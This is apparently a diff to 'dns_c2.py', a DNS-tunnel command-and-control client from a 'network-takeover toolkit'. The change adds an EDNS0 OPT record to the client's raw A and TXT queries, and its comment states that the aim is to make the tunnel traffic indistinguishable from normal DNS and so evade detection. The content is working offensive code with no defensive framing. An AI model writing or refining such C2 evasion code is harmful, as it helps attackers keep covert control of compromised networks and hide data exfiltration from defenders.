@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# v1.0
+# v1.1
 """
 dns_c2.py — DNS tunnel C2 client for the network-takeover toolkit.
 
@@ -99,12 +99,25 @@ def gen_agent_id() -> str:
 
 # ── Raw DNS helpers ────────────────────────────────────────────────────────────
 
+def _opt_rr():
+    """EDNS0 OPT record added to the Additional section of every query.
+
+    Modern resolvers always include OPT in their queries.  Without it our
+    packets are trivially distinguishable from normal DNS traffic at the VPN
+    server acting as our resolver.
+
+    rclass=1232 is the post-2020 DNS flag-day recommended payload size.
+    ttl=0 means no DNSSEC OK bit and extended RCODE 0.
+    """
+    return DNSRR(rrname=b".", type=41, rclass=1232, ttl=0, rdata=b"")
+
+
 def _query_a(qname: str, dns_server: str) -> None:
     """Fire-and-forget DNS A query (no response expected)."""
     pkt = (
         IP(dst=dns_server)
         / UDP(sport=random.randint(1024, 65534), dport=53)
-        / DNS(rd=1, qd=DNSQR(qname=qname, qtype="A"))
+        / DNS(rd=1, qd=DNSQR(qname=qname, qtype="A"), ar=_opt_rr())
     )
     send(pkt, verbose=0)
 
@@ -118,7 +131,7 @@ def _query_txt(qname: str, dns_server: str):
     pkt = (
         IP(dst=dns_server)
         / UDP(sport=random.randint(1024, 65534), dport=53)
-        / DNS(rd=1, qd=DNSQR(qname=qname, qtype="TXT"))
+        / DNS(rd=1, qd=DNSQR(qname=qname, qtype="TXT"), ar=_opt_rr())
     )
     kwargs = {"timeout": 5, "verbose": 0}
     if iface:
